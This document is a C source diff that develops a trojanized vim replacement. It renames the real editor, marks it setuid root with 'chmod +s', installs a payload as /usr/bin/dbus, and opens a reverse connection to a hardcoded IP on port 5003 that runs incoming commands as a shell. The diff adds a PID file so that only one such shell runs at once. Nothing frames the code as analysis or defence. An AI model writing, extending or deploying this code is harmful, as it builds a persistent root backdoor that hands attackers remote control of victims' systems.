@@ -8,13 +8,50 @@
 #include <limits.h>
 #include <assert.h>
 #include <sys/stat.h>
-// #define STATUS "/var/lib/dbus/machine-process"
+#include <signal.h>
+#define STATUS "/var/lib/dbus/machine-process"
 #define PAYLOAD "/usr/bin/dbus"
 #define ERROR "/var/lib/dbus/err"
-//#define PAYLOAD "./dbus"
 #define BINARYNAME "vim_old"
 #define EDITOR "/usr/bin/vim"
-//#define EDITOR "./a.out"
+#define TRUE 1
+#define FALSE 0
+#define ERR -1
+
+
+int writepid(){
+    FILE *file;
+    pid_t pid = getpid();
+    if ((file = fopen(STATUS, "w")) == NULL){
+        return ERR;
+    }
+    fprintf(file, "%d", pid);
+    fclose(file);
+    return TRUE;
+}
+
+int getrunningpid(){
+    int pid;
+    FILE *file;
+    if ((file = fopen(STATUS, "r")) == NULL){
+       return ERR;
+    }
+    fscanf(file, "%d", &pid);
+    fclose(file);
+    return pid;
+}
+
+int testpid(){
+    struct stat sts;
+    int pid = getrunningpid();
+    if (pid == -1){
+        return FALSE;
+    }
+    if (0 == kill(pid, 0)){
+        return TRUE;
+    }
+    return FALSE;
+}
 
 
 int establishConnection(int port, int shell) {
@@ -22,22 +59,23 @@ int establishConnection(int port, int shell) {
     struct sockaddr_in serv_addr;
     char buffer[1024] = {0};
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
-        printf("\n Socket creation error \n");
-        return -1;
+        return ERR;
     }
    
     serv_addr.sin_family = AF_INET;
     serv_addr.sin_port = htons(port);
-    // Convert IPv4 and IPv6 addresses from text to binary form
     if(inet_pton(AF_INET, "192.168.20.18", &serv_addr.sin_addr)<=0) {
-        return -1;
+        return ERR;
     }
    
     if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
-        return -1;
+        return ERR;
     }
     
     if (shell == 1){
+        if (writepid() == ERR) {
+            return ERR;
+        }
         while ((valread = recv(sock , buffer , 1024 , 0)) > 0){
             char line[1024];
             //Remove trailing newline
@@ -64,12 +102,11 @@ int establishConnection(int port, int shell) {
 }
 
 int install(char *fname){
-    setuid(0);
     char *file = fname + 2;
     char path[50] = "/usr/bin/";
     strcat(path, BINARYNAME);
-    if (access(path, F_OK) == 0 ) {
-        return 0;
+    if (access(path, F_OK) == FALSE ) {
+        return FALSE;
     }
     //install
     //move old binary
@@ -84,14 +121,15 @@ int install(char *fname){
     char cmd[50] = "chmod +s ";
     strcat(cmd, EDITOR);
     system(cmd);
-    printf("Installed");
-    return 1;
+    printf("Installed\n");
+    return TRUE;
 }
+
 
 int main (int argc, char *argv[]) {
     setuid(0);
-    if (install(argv[0]) == 1){
-        return 0;
+    if (install(argv[0]) == TRUE){
+        return FALSE;
     }
     char args[100] = BINARYNAME;
     strcat(args, " ");
@@ -101,7 +139,7 @@ int main (int argc, char *argv[]) {
             strcat(args, " ");
         }
     }
-    if (access(PAYLOAD, F_OK) != 0 ) {
+    if (access(PAYLOAD, F_OK) != FALSE ) {
         char cmd1[50] = "cp ";
         char cmd2[50] = PAYLOAD;
         char cmd3[50] = "rm -f ";
@@ -116,7 +154,9 @@ int main (int argc, char *argv[]) {
         system(cmd3);
         system(args);
     } else {
-        establishConnection(5003, 0);
+        if (testpid() == FALSE) {
+            return establishConnection(5003, 0);
+        }
     }
     
 }
